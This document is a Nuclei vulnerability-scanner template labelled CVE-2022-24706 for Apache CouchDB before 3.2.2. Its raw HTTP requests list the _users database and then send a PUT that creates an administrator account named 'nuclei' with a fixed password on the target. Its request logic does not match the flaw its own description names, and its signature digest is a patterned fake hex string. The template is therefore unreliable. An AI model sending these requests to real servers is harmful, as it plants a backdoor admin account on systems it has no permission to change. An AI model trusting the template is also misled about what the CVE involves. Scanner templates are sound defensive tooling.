id: CVE-2022-24706

info:
  name: Apache CouchDB < 3.2.2 - Remote Code Execution
  author: buildingvibes
  severity: critical
  description: |
    Apache CouchDB prior to 3.2.2 contains an authentication bypass vulnerability in improperly secured default installations. An attacker can access the database without authenticating and gain admin privileges, potentially leading to remote code execution.
  impact: |
    Successful exploitation allows an unauthenticated attacker to gain administrative access to the CouchDB instance and execute arbitrary commands on the underlying system.
  remediation: |
    Update Apache CouchDB to version 3.2.2 or later. Properly secure installations according to CouchDB documentation, including implementing authentication and using a firewall.
  reference:
    - http://packetstormsecurity.com/files/167032/Apache-CouchDB-3.2.1-Remote-Code-Execution.html
    - http://www.openwall.com/lists/oss-security/2022/04/26/1
    - https://nvd.nist.gov/vuln/detail/CVE-2022-24706
    - https://docs.couchdb.org/en/stable/cve/2022-24706.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-24706
    cwe-id: CWE-306
    epss-score: 0.97337
    epss-percentile: 0.99832
    cpe: cpe:2.3:a:apache:couchdb:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: apache
    product: couchdb
  tags: cve,cve2022,apache,couchdb,rce,unauth,kev

http:
  - raw:
      - |
        GET /_users/_all_docs HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

      - |
        PUT /_users/org.couchdb.user:nuclei HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"type":"user","name":"nuclei","roles":["_admin"],"password":"nuclei123"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"total_rows"'
          - '"offset"'
          - '"rows"'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"total_rows":(\d+)'
# digest: 4a0a00473045022100de8f3c1e4b2a9f8d7c6e5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d302206f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e:4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c
